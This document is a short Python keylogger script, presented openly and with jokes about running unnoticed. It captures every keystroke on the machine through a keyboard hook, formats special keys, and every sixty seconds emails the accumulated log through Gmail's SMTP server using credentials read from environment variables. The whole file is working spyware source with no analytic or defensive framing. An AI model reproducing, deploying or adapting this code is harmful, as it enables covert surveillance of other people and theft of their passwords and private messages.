# Let's begin keylogging!
# Please run this with the sudo -E python3 command, or else it won't work.
# In Gmail, you must set less secure apps to ON.
import keyboard
import os
import smtplib
from threading import Timer

print("Nothing to see here, just an innocent little program running in the background, please carry on.") 

how_often_to_send_report_in_seconds = 60
# Please set your environment variables to the email address and password. 
email = os.getenv("EMAIL_ADDRESS")
password = os.getenv("EMAIL_PASSWORD")

class Keylogger:
	def __init__(self, interval):
		self.interval = interval
		self.keystrokes = ""

	def on_key_up(self, event):
		name = event.name
		if len(name) > 1:
			# Then we hvae a special key to take care of
			if name == "space":
				name = " "
			elif name == "enter":
				name = "[ENTER]\n"
			elif name == "decimal":
				name = "."
			else:
				name = name.replace(" ", "_")
				name = f"[{name.upper()}]"
		self.keystrokes += name

	def email_results(self, email, password, message):
		print("Sending very innocent mail...")
		server = smtplib.SMTP(host="smtp.gmail.com", port=587)
		server.starttls()
		server.login(email, password)
		server.sendmail(email, email, message)
		server.quit()

	def report_keystrokes(self):
		if self.keystrokes:
			self.email_results(email, password, self.keystrokes)
		self.keystrokes = ""
		timer = Timer(interval=self.interval, function=self.report_keystrokes)
		# It will die when the main thread dies
		timer.daemon = True
		timer.start()
	
	def start(self):
		# Configure on release handler:
		keyboard.on_release(callback=self.on_key_up)
		self.report_keystrokes()
		# It will go until Ctrl+C is hit. 
		keyboard.wait()

if __name__ == "__main__":
	keylogger = Keylogger(interval=how_often_to_send_report_in_seconds)
	keylogger.start()
